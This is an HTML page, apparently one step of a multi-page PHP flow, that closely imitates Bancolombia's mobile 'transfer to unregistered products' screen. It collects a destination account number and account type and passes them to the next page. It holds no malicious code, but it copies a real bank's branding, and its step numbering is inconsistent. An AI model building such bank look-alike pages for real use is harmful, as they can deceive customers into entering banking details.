<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Producto destino – Paso 4 de 5</title>
    <link rel="stylesheet" href="css/estilos.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background-color: #f0f0f0;
            font-family: 'CIBFontSans-Bold', Arial, sans-serif;
            color: #1a1a1a;
            min-height: 100vh;
        }

        /* ── HEADER ── */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 1rem 1.25rem 0.75rem;
            background-color: #f0f0f0;
        }

        .header-nav {
            display: flex;
            align-items: center;
            gap: 0.35rem;
            font-size: 1rem;
            color: #1a1a1a;
            text-decoration: none;
            font-family: 'OpenSans-Regular', Arial, sans-serif;
        }

        .header-logo { display: flex; align-items: center; justify-content: center; }
        .logo-bancolombia { width: 2.4rem; height: 2rem; }

        .header-continuar {
            display: flex;
            align-items: center;
            gap: 0.2rem;
            font-size: 1rem;
            color: #bbb;
            font-family: 'OpenSans-Regular', Arial, sans-serif;
            cursor: default;
            transition: color 0.2s;
            pointer-events: none;
        }

        .header-continuar.activo {
            color: #1a1a1a;
            cursor: pointer;
            pointer-events: auto;
        }

        /* ── BREADCRUMB + TÍTULO ── */
        .page-breadcrumb {
            font-size: 0.82rem;
            color: #555;
            font-family: 'OpenSans-Regular', Arial, sans-serif;
            padding: 1.25rem 1.25rem 0.2rem;
            line-height: 1.4;
        }

        .page-title {
            font-size: 1.9rem;
            font-weight: 700;
            color: #1a1a1a;
            font-family: 'CIBFontSans-Bold', Arial, sans-serif;
            padding: 0 1.25rem 1.25rem;
            letter-spacing: -0.03em;
        }

        /* ── CARD FORMULARIO ── */
        .form-card {
            margin: 0 1rem;
            background-color: #fff;
            border-radius: 1rem;
            padding: 1.25rem 1rem 1.5rem;
        }

        /* Input número de cuenta */
        .input-wrapper {
            border: 1.5px solid #1a1a1a;
            border-radius: 0.75rem;
            padding: 0.85rem 1rem;
            display: flex;
            align-items: center;
            gap: 0.6rem;
            background-color: #fff;
            margin-bottom: 1.5rem;
        }

        .input-icon {
            width: 1.4rem;
            height: 1.4rem;
            stroke: #555;
            fill: none;
            stroke-width: 1.6;
            stroke-linecap: round;
            stroke-linejoin: round;
            flex-shrink: 0;
        }

        .input-inner {
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        .input-floating {
            font-size: 0.72rem;
            color: #888;
            font-family: 'OpenSans-Regular', Arial, sans-serif;
            display: none;
            margin-bottom: 0.1rem;
        }

        .input-inner.tiene-valor .input-floating { display: block; }

        .input-numero {
            font-size: 1rem;
            color: #888;
            font-family: 'OpenSans-Regular', Arial, sans-serif;
            border: none;
            outline: none;
            background: transparent;
            width: 100%;
            -webkit-appearance: none;
        }

        .input-inner.tiene-valor .input-numero {
            font-size: 1.15rem;
            font-weight: 700;
            color: #1a1a1a;
            font-family: 'CIBFontSans-Bold', Arial, sans-serif;
            letter-spacing: -0.01em;
        }

        /* Selecciona tipo */
        .tipo-label {
            font-size: 1rem;
            font-weight: 700;
            color: #1a1a1a;
            font-family: 'CIBFontSans-Bold', Arial, sans-serif;
            letter-spacing: -0.02em;
            margin-bottom: 1rem;
        }

        .radio-grupo {
            display: flex;
            flex-direction: column;
            gap: 0.9rem;
        }

        .radio-item {
            display: flex;
            align-items: center;
            gap: 0.85rem;
            cursor: pointer;
        }

        .radio-circle {
            width: 1.4rem;
            height: 1.4rem;
            border-radius: 50%;
            border: 1.8px solid #bbb;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            transition: border-color 0.15s;
        }

        .radio-circle.seleccionado {
            border-color: #1a1a1a;
            border-width: 2px;
        }

        .radio-dot {
            width: 0.7rem;
            height: 0.7rem;
            border-radius: 50%;
            background-color: #1a1a1a;
            display: none;
        }

        .radio-circle.seleccionado .radio-dot { display: block; }

        .radio-text {
            font-size: 0.97rem;
            color: #1a1a1a;
            font-family: 'OpenSans-Regular', Arial, sans-serif;
        }

        /* ── BOTÓN CONTINUAR FIJO ── */
        .bottom-fixed {
            position: fixed;
            bottom: 0; left: 0;
            width: 100%;
            background-color: #fff;
            padding: 0.85rem 1.25rem 1.1rem;
            border-top: 1px solid #e8e8e8;
            z-index: 100;
        }

        .btn-continuar {
            width: 100%;
            padding: 1.05rem;
            border-radius: 3rem;
            border: 1.5px solid #ccc;
            background-color: #fff;
            font-size: 1.05rem;
            font-weight: 600;
            color: #bbb;
            font-family: 'CIBFontSans-Bold', Arial, sans-serif;
            cursor: default;
            transition: all 0.2s;
            text-align: center;
            text-decoration: none;
            display: block;
        }

        .btn-continuar.activo {
            border-color: #1a1a1a;
            color: #1a1a1a;
            cursor: pointer;
            font-weight: 700;
        }

        .progress-label { font-size: 0.8rem; color: #555; font-family: 'OpenSans-Regular', Arial, sans-serif; margin-top: 0.6rem; }
        .progress-track { width: 100%; height: 4px; background-color: #1a1a1a; border-radius: 2px; margin-top: 0.4rem; }
        .progress-fill  { height: 100%; background-color: #FDDA24; border-radius: 2px; width: 80%; }

        .main-content { padding-bottom: 9rem; }
    </style>
</head>
<body>

<!-- HEADER -->
<header class="header">
    <a href="transferencia_paso4.php" class="header-nav">
        <span style="font-size:1.1rem;">‹</span>
        <span>Volver</span>
    </a>

    <div class="header-logo">
        <svg class="logo-bancolombia" viewBox="0 0 48 40" fill="none">
            <rect x="0" y="4" width="48" height="7" rx="3.5" fill="#1a1a1a"/>
            <rect x="6" y="17" width="36" height="7" rx="3.5" fill="#1a1a1a"/>
            <rect x="12" y="30" width="24" height="7" rx="3.5" fill="#1a1a1a"/>
        </svg>
    </div>

    <a href="#" class="header-continuar" id="headerContinuar">
        <span>Continuar</span>
        <span style="font-size:1.1rem;">›</span>
    </a>
</header>

<!-- CONTENIDO PRINCIPAL -->
<main class="main-content">

    <p class="page-breadcrumb">Transferir a productos no inscritos de Bancolombia</p>
    <h1 class="page-title">Producto destino</h1>

    <div class="form-card">

        <!-- INPUT NÚMERO -->
        <div class="input-wrapper" id="inputWrapper">
            <!-- Icono "#" + tarjeta -->
            <svg class="input-icon" viewBox="0 0 24 24">
                <line x1="9" y1="3" x2="9" y2="21"/>
                <line x1="15" y1="3" x2="15" y2="21"/>
                <line x1="3" y1="9" x2="21" y2="9"/>
                <line x1="3" y1="15" x2="21" y2="15"/>
            </svg>
            <div class="input-inner" id="inputInner">
                <span class="input-floating">Ingresa el número del producto</span>
                <input
                    class="input-numero"
                    id="inputNumero"
                    type="number"
                    placeholder="Ingresa el número del producto"
                    autocomplete="off"
                    inputmode="numeric"
                >
            </div>
        </div>

        <!-- TIPO DE PRODUCTO -->
        <p class="tipo-label">Selecciona el tipo de producto</p>

        <div class="radio-grupo">
            <div class="radio-item" onclick="seleccionarTipo('ahorros')">
                <div class="radio-circle" id="radio-ahorros">
                    <div class="radio-dot"></div>
                </div>
                <span class="radio-text">Ahorros</span>
            </div>
            <div class="radio-item" onclick="seleccionarTipo('corriente')">
                <div class="radio-circle" id="radio-corriente">
                    <div class="radio-dot"></div>
                </div>
                <span class="radio-text">Corriente</span>
            </div>
        </div>

    </div>

</main>

<!-- BOTÓN CONTINUAR FIJO -->
<div class="bottom-fixed">
    <a href="#" class="btn-continuar" id="btnContinuar">Continuar</a>
    <p class="progress-label">Paso 4 de 5</p>
    <div class="progress-track">
        <div class="progress-fill"></div>
    </div>
</div>

<script>
    var tipoSeleccionado = '';
    var numeroCuenta = '';

    function seleccionarTipo(tipo) {
        tipoSeleccionado = tipo;
        document.getElementById('radio-ahorros').classList.remove('seleccionado');
        document.getElementById('radio-corriente').classList.remove('seleccionado');
        document.getElementById('radio-' + tipo).classList.add('seleccionado');
        verificar();
    }

    var inputNum = document.getElementById('inputNumero');
    var inputInner = document.getElementById('inputInner');

    inputNum.addEventListener('input', function() {
        numeroCuenta = this.value.trim();
        if (numeroCuenta.length > 0) {
            inputInner.classList.add('tiene-valor');
        } else {
            inputInner.classList.remove('tiene-valor');
        }
        verificar();
    });

    function verificar() {
        var btn = document.getElementById('btnContinuar');
        var hdr = document.getElementById('headerContinuar');
        if (numeroCuenta.length >= 6 && tipoSeleccionado !== '') {
            btn.classList.add('activo');
            hdr.classList.add('activo');
            var url = 'transferencia_paso6.php?cuenta=' + encodeURIComponent(numeroCuenta) + '&tipo=' + encodeURIComponent(tipoSeleccionado);
            btn.href = url;
            hdr.href = url;
        } else {
            btn.classList.remove('activo');
            hdr.classList.remove('activo');
            btn.href = '#';
            hdr.href = '#';
        }
    }

    document.getElementById('btnContinuar').addEventListener('click', function(e) {
        if (!this.classList.contains('activo')) e.preventDefault();
    });
</script>

</body>
</html>
